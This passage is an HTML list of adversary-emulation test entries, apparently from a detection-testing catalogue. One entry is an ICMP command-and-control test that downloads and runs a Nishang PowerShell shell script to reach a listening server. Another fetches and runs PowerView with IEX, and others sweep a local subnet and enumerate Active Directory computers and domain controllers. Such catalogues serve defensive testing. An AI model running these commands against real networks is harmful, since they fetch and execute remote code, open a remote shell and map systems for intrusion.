<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 0268e63c-e244-42db-bef7-72a9e59fc1fc</li>
<li><strong>name</strong>: ICMP C2</li>
<li>
<p><strong>description</strong>: This will attempt to  start C2 Session Using ICMP. For information on how to set up the listener
refer to the following blog: https://www.blackhillsinfosec.com/how-to-c2-over-icmp/</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')
Invoke-PowerShellIcmp -IPAddress #{server_ip}</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1095</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: {'description': 'The IP address of the listening server', 'type': 'string', 'default': '127.0.0.1'}</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: baa01aaa-5e13-45ec-8a0d-e46c93c9760f</li>
<li><strong>name</strong>: Remote System Discovery - nslookup</li>
<li><strong>description</strong>: Powershell script that runs nslookup on cmd.exe against the local /24 network of the first network adaptor listed in ipconfig.</li>
</ul>
<p>Upon successful execution, powershell will identify the ip range (via ipconfig) and perform a for loop and execute nslookup against that IP range. Output will be via stdout.</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: $localip = ((ipconfig | findstr [0-9]..)[0]).Split()[-1]
$pieces = $localip.split(".")
$firstOctet = $pieces[0]
$secondOctet = $pieces[1]
$thirdOctet = $pieces[2]
foreach ($ip in 1..255 | % { "$firstOctet.$secondOctet.$thirdOctet.$_" } ) {cmd.exe /c nslookup $ip}</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1018</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 962a6017-1c09-45a6-880b-adc9c57cb22e</li>
<li><strong>name</strong>: Enumerate domain computers within Active Directory using DirectorySearcher</li>
<li>
<p><strong>description</strong>: This test is a Powershell script that enumerates Active Directory to determine computers that are joined to the domain. 
This test is designed to mimic how SessionGopher can determine the additional systems within a domain, which has been used before by threat actors to aid in lateral movement. 
Reference: <a href="https://www.mandiant.com/resources/head-fake-tackling-disruptive-ransomware-attacks">Head Fake: Tackling Disruptive Ransomware Attacks</a>. 
Upon successful execution, this test will output the names of the computers that reside on the domain to the console window. </p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher("(ObjectCategory=Computer)")
$DirectorySearcher.PropertiesToLoad.Add("Name")
$Computers = $DirectorySearcher.findall()
foreach ($Computer in $Computers) {
  $Computer = $Computer.Properties.name
  if (!$Computer) { Continue }
  Write-Host $Computer}</p>
</li>
<li>
<p><strong>prereq_command</strong>: if ((Get-WmiObject -Class Win32_ComputerSystem).partofdomain -eq $true) {exit 0} else {exit 1}</p>
</li>
<li><strong>get_prereq_command</strong>: write-host "This PC must be manually added to a domain." </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1018</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 97e89d9e-e3f5-41b5-a90f-1e0825df0fdf</li>
<li><strong>name</strong>: Enumerate Active Directory Computers with Get-AdComputer</li>
<li>
<p><strong>description</strong>: The following Atomic test will utilize Get-AdComputer to enumerate Computers within Active Directory.
Upon successful execution a listing of Computers will output with their paths in AD.
Reference: https://github.com/MicrosoftDocs/windows-powershell-docs/blob/main/docset/winserver2022-ps/activedirectory/Get-ADComputer.md</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Get-AdComputer -Filter *</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1018</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 64ede6ac-b57a-41c2-a7d1-32c6cd35397d</li>
<li><strong>name</strong>: Enumerate Active Directory Computers with ADSISearcher</li>
<li>
<p><strong>description</strong>: The following Atomic test will utilize ADSISearcher to enumerate computers within Active Directory.
Upon successful execution a listing of computers will output with their paths in AD.
Reference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: ([adsisearcher]"objectcategory=computer").FindAll(); ([adsisearcher]"objectcategory=computer").FindOne()</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1018</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: b9d2e8ca-5520-4737-8076-4f08913da2c4</li>
<li><strong>name</strong>: Get-DomainController with PowerView</li>
<li>
<p><strong>description</strong>: Utilizing PowerView, run Get-DomainController to identify the Domain Controller. Upon execution, information about the domain controller within the domain will be displayed.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1018</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: e3cf5123-f6c9-4375-bdf2-1bb3ba43a1ad</li>
<li><strong>name</strong>: Get-WmiObject to Enumerate Domain Controllers</li>
<li>
<p><strong>description</strong>: The following Atomic test will utilize get-wmiobject to enumerate Active Directory for Domain Controllers.
Upon successful execution a listing of Systems from AD will output with their paths.
Reference: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: try { get-wmiobject -class ds_computer -namespace root\directory\ldap -ErrorAction Stop }
catch { $<em>; exit $</em>.Exception.HResult }</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1018</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
